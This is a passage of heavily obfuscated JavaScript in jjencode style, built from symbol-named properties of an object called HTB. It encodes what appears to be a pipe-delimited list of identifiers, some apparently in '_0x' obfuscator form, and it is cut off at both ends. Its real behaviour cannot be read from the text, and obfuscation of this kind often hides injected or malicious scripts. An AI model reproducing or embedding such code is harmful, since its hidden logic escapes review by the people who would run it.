+HTB.$$$+"\\"+HTB.__$+HTB.__$+HTB.$$$+"\\"+HTB.__$+HTB.__$+HTB.$$_+HTB.$$_$+"\\"+HTB.__$+HTB._$_+HTB.$$_+"\\"+HTB.__$+HTB.$_$+HTB.$_$+HTB._$+"\\"+HTB.__$+HTB._$$+HTB.__$+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$$$+HTB._+"\\"+HTB.__$+HTB.$$_+HTB.___+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$_$+"\\"+HTB.__$+HTB.___+HTB._$$+HTB.$_$_+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB._$_+"\\"+HTB.__$+HTB._$_+HTB.$__+"\\"+HTB.__$+HTB.___+HTB._$_+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$_$+"\\"+HTB.__$+HTB._$_+HTB._$$+"|\\"+HTB.__$+HTB.$_$+HTB.___+"\\"+HTB.__$+HTB._$_+HTB._$$+HTB._$+"\\"+HTB.__$+HTB.$$_+HTB.$$_+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB._$_+"\\"+HTB.__$+HTB.___+HTB._$$+"\\"+HTB.__$+HTB.___+HTB.$__+(![]+"")[HTB._$_]+HTB.$_$_+"|\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB.__$+HTB.$$$+"\\"+HTB.__$+HTB.$$$+HTB.__$+"\\"+HTB.__$+HTB.__$+HTB.$_$+"\\"+HTB.__$+HTB.$$_+HTB.___+HTB._+HTB.$__+"\\"+HTB.__$+HTB.___+HTB._$_+"|\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB._$_+(![]+"")[HTB._$_]+HTB.$$_$+"\\"+HTB.__$+HTB.__$+HTB.$__+"\\"+HTB.__$+HTB.$_$+HTB.___+HTB.$$_$+HTB.$$_$+"\\"+HTB.__$+HTB._$_+HTB.__$+"\\"+HTB.__$+HTB.__$+HTB.___+"\\"+HTB.__$+HTB.$_$+HTB.__$+"|\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.___+HTB.$$$_+"\\"+HTB.__$+HTB._$_+HTB.__$+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$_$+"\\"+HTB.__$+HTB.$_$+HTB.___+HTB.$$__+"\\"+HTB.__$+HTB.__$+HTB.___+HTB.$___+HTB._$+"\\"+HTB.__$+HTB.$_$+HTB.$$_+"|\\"+HTB.__$+HTB.$_$+HTB.__$+"\\"+HTB.__$+HTB.$_$+HTB.$_$+HTB._$+"\\"+HTB.__$+HTB._$_+HTB._$$+"\\"+HTB.__$+HTB.___+HTB.__$+"\\"+HTB.__$+HTB.__$+HTB._$$+"\\"+HTB.__$+HTB._$_+HTB.$__+"\\"+HTB.__$+HTB.___+HTB.__$+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$_$+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$__+"\\"+HTB.__$+HTB._$_+HTB.__$+"\\"+HTB.__$+HTB.$$_+HTB.$$_+"\\"+HTB.__$+HTB._$_+HTB._$_+HTB.$$_$+"\\"+HTB.__$+HTB.__$+HTB.___+"\\"+HTB.__$+HTB._$$+HTB._$_+HTB._+"|\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.___+HTB.$_$_+"\\"+HTB.__$+HTB.___+HTB._$$+HTB.$_$_+"\\"+HTB.__$+HTB.__$+HTB._$$+HTB.$__+HTB.__$+"|\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.__$+HTB._$$+HTB.$$_$+"\\"+HTB.__$+HTB.__$+HTB._$$+"\\"+HTB.__$+HTB.__$+HTB._$$+"\\"+HTB.__$+HTB.___+HTB._$_+HTB.$$_$+"\\"+HTB.__$+HTB._$_+HTB._$$+"\\"+HTB.__$+HTB._$$+HTB.__$+"\\"+HTB.__$+HTB.___+HTB._$_+HTB.$$_$+"\\"+HTB.__$+HTB._$_+HTB.__$+HTB.$$$_+HTB.$__+"\\"+HTB.__$+HTB._$$+HTB._$_+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$$$+"\\"+HTB.__$+HTB.$_$+HTB.___+HTB.$$__+"\\"+HTB.__$+HTB._$_+HTB._$$+HTB.$_$_+"|\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$$_+HTB.$$$_+"\\"+HTB.__$+HTB.___+HTB._$_+"\\"+HTB.__$+HTB.$$_+HTB.___+HTB.__+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$__+"\\"+HTB.__$+HTB.__$+HTB.$__+"\\"+HTB.__$+HTB.$_$+HTB.___+HTB.$$_$+HTB.$$_$+"\\"+HTB.__$+HTB.__$+HTB._$_+"\\"+HTB.__$+HTB.$_$+HTB.$_$+HTB._$+HTB._+HTB.$_$_+"\\"+HTB.__$+HTB.$__+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.$$$+"|\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$$_+HTB.$$$+HTB.$$__+"\\"+HTB.__$+HTB.__$+HTB.___+"\\"+HTB.__$+HTB.___+HTB._$$+HTB._$+"\\"+HTB.__$+HTB.___+HTB.$_$+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB._$_+HTB.__+HTB.$$_$+"\\"+HTB.__$+HTB._$_+HTB._$$+"\\"+HTB.__$+HTB._$_+HTB.$$$+"|\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$_$+HTB.$_$+"\\"+HTB.__$+HTB._$_+HTB.$$_+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$$$+HTB.___+HTB.$_$_+HTB.$$__+"\\"+HTB.__$+HTB.$_$+HTB.$_$+"\\"+HTB.__$+HTB.$_$+HTB._$$+"\\"+HTB.__$+HTB.___+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB.__$+HTB.$$$+"|"+HTB.$$_$+"\\"+HTB.__$+HTB.__$+HTB.___+"\\"+HTB.__$+HTB.___+HTB._$$+HTB._$+"\\"+HTB.__$+HTB.$$_+HTB._$$+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$_+"|\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$$_+"\\"+HTB.__$+HTB.___+HTB.$$_+HTB.$$__+"\\"+HTB.__$+HTB.__$+HTB._$_+"\\"+HTB.__$+HTB.$$_+HTB.$$$+HTB.$$_$+HTB.$$_$+"\\"+HTB.__$+HTB.___+HTB.$$$+HTB.$_$_+"|\\"+HTB.__$+HTB.$__+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB._$$+HTB._$+"\\"+HTB.__$+HTB.__$+HTB.__$+"\\"+HTB.__$+HTB.$$_+HTB._$_+"\\"+HTB.__$+HTB.$__+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.___+"\\"+HTB.__$+HTB.$_$+HTB.$_$+"|\\"+HTB.__$+HTB.$_$+HTB.___+"\\"+HTB.__$+HTB._$_+HTB._$$+HTB._$+HTB.$__$+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.___+"\\"+HTB.__$+HTB.___+HTB._$$+"\\"+HTB.__$+HTB._$_+HTB._$_+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB.__$+HTB.$$$+HTB.$___+"|"+HTB.$_$_+HTB.$___+HTB._$+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB.__$+HTB.$$$+HTB.$$_$+HTB.$$_$+"\\"+HTB.__$+HTB._$_+HTB._$_+"\\"+HTB.__$+HTB._$$+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.__$+"|\\"+HTB.__$+HTB.$_$+HTB._$_+HTB.$___+HTB._$+HTB.$___+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$$_+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB.$$$+HTB._$_+"\\"+HTB.__$+HTB.$_$+HTB._$_+HTB.$_$_+"|\\"+HTB.__$+HTB.$_$+HTB.__$+HTB.__$+(![]+"")[HTB._$_]+HTB.$$__+"\\"+HTB.__$+HTB.___+HTB.$$$+"\\"+HTB.__$+HTB.$__+HTB.$$$+HTB.$$_$+HTB.$$__+"\\"+HTB.__$+HTB.__$+HTB.__$+"\\"+HTB.__$+HTB.___+HTB._$$+HTB._$+"\\"+HTB.__$+HTB.__$+HTB.$$_+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB.__$+HTB.$$$+"\\"+HTB.__$+HTB.___+HTB.$$_+HTB.$$_$+"\\"+HTB.__$+HTB._$_+HTB.__$+"\\"+HTB.__$+HTB._$_+HTB._$$+HTB._$+HTB.$___+"|"+HTB.$_$$+"\\"+HTB.__$+HTB._$_+HTB._$$+HTB._$+HTB.$$_+"\\"+HTB.__$+HTB.$$$+HTB._$_+"\\"+HTB.__$+HTB._$_+HTB._$$+HTB._$+HTB.$$$$+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB.__$+HTB.$$$+"\\"+HTB.__$+HTB.$_$+HTB.$_$+"|\\"+HTB.__$+HTB.$$_+HTB._$$+HTB._$$+"\\"+HTB.__$+HTB.__$+HTB.$$_+HTB.$$__+"\\"+HTB.__$+HTB._$_+HTB._$$+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$___+"|"+HTB._$+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$__+"\\"+HTB.__$+HTB.__$+HTB.$_$+HTB._$_+HTB.$_$+HTB.$$_$+"|\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB._$_+"\\"+HTB.__$+HTB.$$_+HTB.__$+"\\"+HTB.__$+HTB._$_+HTB._$_+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$__+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB.___+HTB.__$+"\\"+HTB.__$+HTB.$$_+HTB._$$+HTB._$_+HTB.$__+(![]+"")[HTB._$_]+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$_$+"\\"+HTB.__$+HTB.$$$+HTB._$_+HTB._$_+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.___+"\\"+HTB.__$+HTB.$$_+HTB.__$+"|\\"+HTB.__$+HTB.___+HTB.__$+HTB.___+"\\"+HTB.__$+HTB.___+HTB.$$_+HTB.$$_$+"\\"+HTB.__$+HTB.___+HTB.$$$+"\\"+HTB.__$+HTB._$$+HTB.__$+HTB._$$+HTB.$$__+"\\"+HTB.__$+HTB._$_+HTB.$__+"\\"+HTB.__$+HTB.___+HTB.$$$+"|\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$$_+HTB.___+"\\"+HTB.__$+HTB.$$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.$$$+HTB.$_$+"\\"+HTB.__$+HTB.$$$+HTB._$_+(![]+"")[HTB._$_]+"\\"+HTB.__$+HTB.$$_+HTB.$$$+"\\"+HTB.__$+HTB.___+HTB.$$$+"|\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB.__$+HTB.$$$+"\\"+HTB.__$+HTB.__$+HTB._$_+HTB.$$_$+"\\"+HTB.__$+HTB.__$+HTB.$$_+"\\"+HTB.__$+HTB._$_+HTB._$$+"\\"+HTB.__$+HTB.$_$+HTB._$$+HTB.$$$_+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.___+"\\"+HTB.__$+HTB.$$_+HTB.___+HTB.$$__+"\\"+HTB.__$+HTB._$_+HTB.__$+"\\"+HTB.__$+HTB._$_+HTB.$$$+"|"+HTB.$$_$+"\\"+HTB.__$+HTB._$_+HTB.$$_+"\\"+HTB.__$+HTB._$_+HTB.$$$+"|\\"+HTB.__$+HTB.$$_+HTB._$$+"\\"+HTB.__$+HTB.$_$+HTB.$_$+"\\"+HTB.__$+HTB.$_$+HTB._$$+"\\"+HTB.__$+HTB._$$+HTB._$_+"\\"+HTB.__$+HTB.$_$+HTB.___+"\\"+HTB.__$+HTB._$_+HTB._$$+HTB._$+"|\\"+HTB.__$+HTB.$$$+HTB.___+"\\"+HTB.__$+HTB._$_+HTB.$$$+"|\\"+HTB.__$+HTB.___+HTB.$_$+"\\"+HTB.__$+HTB._$$+HTB.___+HTB._$$+HTB.$$_$+"\\"+HTB.__$+HTB.___+HTB.$$$+HTB._+HTB.$__+"\\"+HTB.__$+HTB._$_+HTB.$_$+"|\\"+HTB.__$+HTB.$_$+HTB.$_$+"\\"+HTB.__$+HTB._$_+HTB._$$+HTB._$+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB.___+"|"+HTB.$$_$+HTB.$$$_+"\\"+HTB.__$+HTB.$$_+HTB.$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$$$$+HTB.$_$_+HTB.$_$+"|\\"+HTB.__$+HTB.___+HTB.$$_+HTB._+"\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB.$$__+HTB.__+"\\"+HTB.__$+HTB.$_$+HTB.__$+HTB._$+"\\"+HTB.__$+HTB.$_$+HTB.$$_+"|\\"+HTB.__$+HTB.__$+HTB.$$_+"\\"+HTB.__$+HTB.__$+HTB._$$+"\\"+HTB.__$+HTB.__$+HTB._$_+"\\"+HTB.__$+HTB._$_+HTB._$$+"\\"+HTB.__$+HTB.__$+HTB.$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB.__$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$__+"|\\"+HTB.__$+HTB.___+HTB.$_$+"\\"+HTB.__$+HTB.$_$+HTB.__$+HTB.$_$$+"\\"+HTB.__$+HTB.__$+HTB.$__+"|"+HTB.__+"\\"+HTB.__$+HTB.$$_+HTB._$_+"\\"+HTB.__$+HTB.$$$+HTB.__$+"|"+HTB.__$+"\\"+HTB.__$+HTB._$_+HTB._$$+"\\"+HTB.__$+HTB.$$$+HTB.__$+"\\"+HTB.__$+HTB._$_+HTB.$__+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.___+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB.___+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$__$+"|"+HTB.$$__+HTB.$_$_+HTB.__+HTB.$$__+"\\"+HTB.__$+HTB.$_$+HTB.___+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$$+HTB.$$$$+HTB.$$_+HTB.$_$$+HTB.$$$$+HTB.$_$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$__$+HTB._$_+HTB.$$_$+HTB.$__+HTB.$__$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB.$__$+HTB.$___+HTB.___+HTB.$$_$+HTB._$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$$$_+HTB.__$+HTB.$$_$+HTB.$__+HTB.$$$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB.$$__+HTB.$_$+HTB.__$+HTB.$___+HTB.$_$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$_$$+HTB.$_$+HTB.$$$$+HTB.$__+HTB.$___+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB._$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$___+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$___+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$_$_+"|\\"+HTB.__$+HTB.$$_+HTB._$_+"\\"+HTB.__$+HTB.$_$+HTB.$$_+"|\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.___+HTB.__+"\\"+HTB.__$+HTB.$_$+HTB.___+"\\"+HTB.__$+HTB.$_$+HTB.__$+"\\"+HTB.__$+HTB.$$_+HTB._$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$__+"|\\"+HTB.__$+HTB.$$$+HTB._$_+"|"+HTB.$$$_+"\\"+HTB.__$+HTB.$_$+HTB.$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$_$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$$$+HTB.$$__+HTB.$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$$__+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$$_+"|\\"+HTB.__$+HTB.$_$+HTB._$$+"\\"+HTB.__$+HTB.___+HTB.$__+"\\"+HTB.__$+HTB.$__+HTB.$$$+HTB.$_$$+"\\"+HTB.__$+HTB.$$_+HTB.$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$___+"|"+(![]+"")[HTB._$_]+"\\"+HTB.__$+HTB._$_+HTB.$__+HTB.$$_+"\\"+HTB.__$+HTB.$_$+HTB._$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB._$_+"|"+HTB.__+HTB.$_$_+HTB.$_$$+(![]+"")[HTB._$_]+HTB.$$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$$__+"|\\"+HTB.__$+HTB.$$_+HTB._$$+"\\"+HTB.__$+HTB.__$+HTB.$$$+"\\"+HTB.__$+HTB.$$_+HTB.$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB._$_+"|"+HTB._$+"\\"+HTB.__$+HTB.___+HTB.__$+"\\"+HTB.__$+HTB.$$_+HTB._$_+"\\"+HTB.__$+HTB.__$+HTB.___+"\\"+HTB.__$+HTB.$__+HTB.$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.__$+"|\\"+HTB.__$+HTB.$$_+HTB.$$$+"\\"+HTB.__$+HTB.$_$+HTB.__$+"\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB.$$_$+HTB._$+"\\"+HTB.__$+HTB.$$_+HTB.$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB._$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$__+HTB.$__$+HTB.$$__+HTB.$$__+HTB.$__$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$_$$+"|"+HTB.$__+"\\"+HTB.__$+HTB.$_$+HTB._$_+"\\"+HTB.__$+HTB.___+HTB.$$_+"|\\"+HTB.__$+HTB.___+HTB.$_$+"\\"+HTB.__$+HTB.$_$+HTB._$$+"\\"+HTB.__$+HTB.__$+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB._$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB.$_$+HTB.$__$+HTB.$$$_+HTB.$$$$+HTB.$$$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB.$$_$+HTB.__$+HTB.$$_+HTB.$$$$+HTB.$_$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$_$$+"|"+HTB.$_$$+"\\"+HTB.__$+HTB.$$_+HTB._$_+HTB.$$$_+HTB.$_$_+"\\"+HTB.__$+HTB.$_$+HTB._$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$___+HTB.$_$+HTB.$_$+HTB.$$$$+HTB._$_+HTB._$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$$_$+"|"+HTB.$_$_+"|\\"+HTB.__$+HTB.$$_+HTB._$$+HTB.__+"\\"+HTB.__$+HTB.$$_+HTB._$_+"\\"+HTB.__$+HTB.$_$+HTB.__$+"\\"+HTB.__$+HTB.$_$+HTB.$$_+"\\"+HTB.__$+HTB.$__+HTB.$$$+"\\"+HTB.__$+HTB.$_$+HTB.__$+HTB.$$$$+"\\"+HTB.__$+HTB.$$$+HTB.__$+"|"+HTB.$_$_+HTB.$$_$+HTB.$__$+HTB.$__$+HTB.$$__+HTB.$$_+HTB.$$$$+HTB.___+HTB._$$+HTB.$__+HTB.$$_$+HTB.__$+HTB.$$$_+HTB.$_$_+HTB.__$+HTB.$$__+HTB.$___+HTB.___+HTB.$$_+HTB.$__$+HTB.$__+HTB.$$_+HTB.$_$_+HTB.$$__+HTB.$_$_+HTB.___+HTB.$$_$+HTB._$$+HTB.$$$+HTB.$$_$+HTB.$$$_+HTB.$_$+"|"+HTB.$$__+HTB.$__+HTB.$__$+HTB.$_$+HTB.___+HTB.$$__+HTB.$__+HTB.$__+HTB.$_$+HTB.$$__+HTB.$$$_+HTB.$$$+HTB.$$_+HTB.$$__+HTB.$___+HTB.___+HTB.$__$+HTB.___+HTB.$$__+HTB._$$+HTB.$__$+HTB._$$+HTB.___+HTB.__$+HTB.$$__+HTB.$_$$+HTB.$$_+HTB.$$$_+HTB.$_$_+HTB.$$_+HTB.__$+HTB.$$_$+"|"+HTB.$_$$+HTB.$$$+HTB.$_$_+HTB.___+HTB.$$_$+HTB.__$+HTB.___+HTB.$$_$+HTB.$$_$+HTB.$_$_+HTB.$_$+HTB.$___+HTB.$$$_+HTB.$$_$+HTB.__$+HTB._$$+HTB.$_$+HTB.$$_+HTB.__$+HTB.$$__+HTB.$$$_+HTB.$_$+HTB.$___+HTB.__$+HTB.___+HTB._$_+HTB.__$+HTB.$___+HTB.$$_$+HTB.$_$+HTB.$_$_+HTB.$__+"|\\"+HTB.__$+HTB.__$+HTB._$_+"\\"+HTB.__$+HTB._$_+HTB._$$+"\\"+HTB.__$+HTB.__$+HTB.$$$+"\\"+HTB.__$+HTB.__$+HTB.$$_+"|"+HTB.$_$$+HTB.__+HTB._$+HTB.$_$_+"|\\"+HTB.__$+HTB.$_$+HTB.___+"\\"+HTB.__$+HTB._$_+HTB.$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$$_$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$_$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$_$$+"|\\"+HTB.__$+HTB._$_+HTB._$_+"\\"+HTB.__$+HTB.__$+HTB.$__+HTB._+"\\"+HTB.__$+HTB.___+HTB._$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$_$$+HTB.$_$$+HTB.$_$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$$+HTB.___+HTB._$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$$_+HTB.$_$$+HTB.$___+"|"+HTB.$$_+"\\"+HTB.__$+HTB.$$_+HTB.___+"\\"+HTB.__$+HTB.__$+HTB.$$$+"\\"+HTB.__$+HTB.$_$+HTB.$_$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB._$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.___+"|\\"+HTB.__$+HTB.__$+HTB.__$+"\\"+HTB.__$+HTB.$$_+HTB._$_+HTB.$___+HTB.$$__+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$___+"|\\"+HTB.__$+HTB.$$$+HTB.___+"\\"+HTB.__$+HTB.$$_+HTB.___+"\\"+HTB.__$+HTB._$$+HTB._$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$__$+"|\\"+HTB.__$+HTB.___+HTB.$__+"\\"+HTB.__$+HTB.__$+HTB._$_+"\\"+HTB.__$+HTB.___+HTB._$_+"\\"+HTB.__$+HTB.$_$+HTB._$$+"\\"+HTB.__$+HTB.$$$+HTB.___+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$$_$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB._$_+HTB.$_$_+HTB.$$$$+"|\\"+HTB.__$+HTB.$$_+HTB._$$+"\\"+HTB.__$+HTB.$$_+HTB.$$$+"\\"+HTB.__$+HTB.$_$+HTB.__$+HTB.__+HTB.$$__+"\\"+HTB.__$+HTB.$_$+HTB.___+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$__+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB._$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.___+HTB.$_$$+"|\\"+HTB.__$+HTB.$_$+HTB.___+"\\"+HTB.__$+HTB.__$+HTB.$$$+"\\"+HTB.__$+HTB.__$+HTB.$__+HTB._$$+"|\\"+HTB.__$+HTB.___+HTB._$$+"\\"+HTB.__$+HTB.$$$+HTB.__$+HTB.$$_+"\\"+HTB.__$+HTB.$_$+HTB.$_$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$_$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$_$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$$$_+"|"+HTB.$_$_+HTB.___+HTB._$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$__+HTB.$$$+HTB._$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$$$+HTB.$__+HTB.$_$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB._$_+HTB.$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$_$+HTB.$_$_+HTB.$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$_+HTB.$$_$+HTB.$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$$+HTB.$_$+HTB.$_$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB._$_+HTB.$$$+HTB._$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB._$$+HTB.$_$$+HTB.$_$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.__$+HTB._$_+HTB.$$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB._$$+HTB.$_$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB.$_$_+HTB.___+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$$_+HTB.$$$$+HTB.$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$_$$+HTB.$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB._$_+HTB.$$_+HTB._$_+"|\\"+HTB.__$+HTB.___+HTB._$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$$+HTB.__$+HTB.$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$___+HTB.___+HTB.$$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$_+HTB.$___+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB.$__$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$_+HTB.$$_+HTB.$$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__$+HTB.__$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$_+HTB.$$__+HTB.__$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB._$$+HTB.$$_+HTB._$$+"|\\"+H